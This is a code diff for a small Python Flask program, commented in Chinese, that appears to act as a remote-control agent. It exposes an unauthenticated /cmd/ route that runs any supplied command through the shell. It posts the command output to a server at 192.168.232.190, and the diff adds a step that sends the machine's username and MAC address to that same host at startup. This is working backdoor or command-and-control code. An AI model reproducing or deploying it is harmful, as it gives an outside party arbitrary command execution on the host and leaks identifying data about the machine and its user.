@@ -1,6 +1,6 @@
-import socket
+import getpass
 import subprocess
-import time
+import threading
 
 import netifaces
 import requests
@@ -9,11 +9,11 @@ from flask import Flask
 app = Flask(__name__)
 
 
-# 获取MAC地址
+# 获取本机 MAC 地址
 def get_mac_address():
     interfaces = netifaces.interfaces()
     for interface in interfaces:
-        if interface == 'lo':
+        if interface == 'lo':  # 跳过本地回环接口
             continue
         mac = netifaces.ifaddresses(interface).get(netifaces.AF_LINK)
         if mac:
@@ -21,14 +21,19 @@ def get_mac_address():
     return None
 
 
-# 客户端
+# 发送uid，mac
+def pcinfo():
+    # 获取当前用户的用户名
+    username = getpass.getuser()
+    uid = username
+    mac = get_mac_address()
+    info = {'UID': uid, 'MAC': mac}
+    requests.post("http://192.168.232.190:90/save_info/", json=info)  # 发送JSON数据
+
+
+# 客户端请求处理函数
 @app.route('/cmd/<command>')
 def cmd(command):
-    mac = get_mac_address()
-    if mac is None:
-        return "Failed to get MAC address"
-
-    # 执行命令并获取进程对象
     screen_data = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 
     while True:
@@ -36,22 +41,26 @@ def cmd(command):
         if line == b'':
             screen_data.stdout.close()
             break
-        dem_stdout = line.decode('gbk').encode('utf-8')
-
-        uid = str(time.time())
-        ip = socket.gethostbyname(socket.gethostname())
-        mac = get_mac_address()
-        info = {'UID': uid, 'IP': ip, 'MAC': mac}
+        dem_stdout = line.decode('gbk').encode('utf-8')  # 解码和编码，以处理中文字符
 
         try:
-            requests.post("http://127.0.0.1:90/result/", data={'result': dem_stdout})
-            requests.post("http://127.0.0.1:90/save_info/", json=info)  # 发送JSON数据
+            # print(dem_stdout)
+            requests.post("http://192.168.232.190:90/result/", data={'result': dem_stdout})  # 发送结果至服务器
         except Exception as e:
             print(f"Error sending request: {e}")
 
     return str(dem_stdout)
 
 
+# 启动 Flask 服务器
+def run_server():
+    app.run('0.0.0.0', 80, False)
+
+
+# 主函数入口
 if __name__ == '__main__':
-    # 启动Flask服务器
-    app.run('0.0.0.0', 80, True)
+    # 创建新线程运行 Flask 服务器
+    server_thread = threading.Thread(target=run_server)
+    server_thread.start()
+    # 发送pcinfo
+    pcinfo()
